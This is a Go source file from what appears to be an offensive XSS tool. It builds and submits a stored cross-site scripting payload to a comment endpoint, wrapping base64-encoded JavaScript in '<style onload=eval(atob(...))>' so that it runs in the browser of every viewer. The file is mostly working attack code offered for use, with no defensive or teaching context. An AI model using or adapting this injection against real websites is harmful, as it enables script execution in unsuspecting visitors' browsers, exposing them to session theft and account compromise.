package xss

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var (
	path        string = "/comment/1"
	typeRequest string = "application/x-www-form-urlencoded"
	client      http.Client
)

//RequestResult is Return Body from the server
type RequestResult struct {
	Message interface{}
	Result  interface{}
}

//XSSVector inital xss attack
func (s *Client) XSSVector() *RequestResult {
	client := &http.Client{}

	fullURL := fmt.Sprintf("%s%s", s.URLBase, path)
	payload := s.GetPayload()
	r := s.postRequest(fullURL, payload.EncodedPayload)
	resp, _ := client.Do(r)

	bodyf := FetchBody(resp)
	defer resp.Body.Close()
	return &RequestResult{bodyf["message"], bodyf["result"]}
}

//postRequest is the main function for send post request
func (s *Client) postRequest(fullurl string, payload string) *http.Request {
	payloadData := fmt.Sprintf("GoLang Robot!!<style onload=eval(atob('%s')); ></style>", payload)

	data := url.Values{}
	data.Set("comment", payloadData)

	r, err := http.NewRequest("POST", fullurl, strings.NewReader(data.Encode())) // URL-encoded payload
	if err != nil {
		panic(err)
	}
	r.Header.Add("User-Agent", "GoLang Client")
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
	return r
}

//getRequest us
func (s *Client) getRequest(fullURL string) (*RequestResult, *http.Response) {

	req, err := http.Get(fullURL)
	if err != nil {
		log.Fatal("Cant send get request ", err)
	}
	defer req.Body.Close()

	var getResult RequestResult
	if err := json.NewDecoder(req.Body).Decode(&getResult); err != nil {
		return nil, nil
	}
	return &getResult, req
}
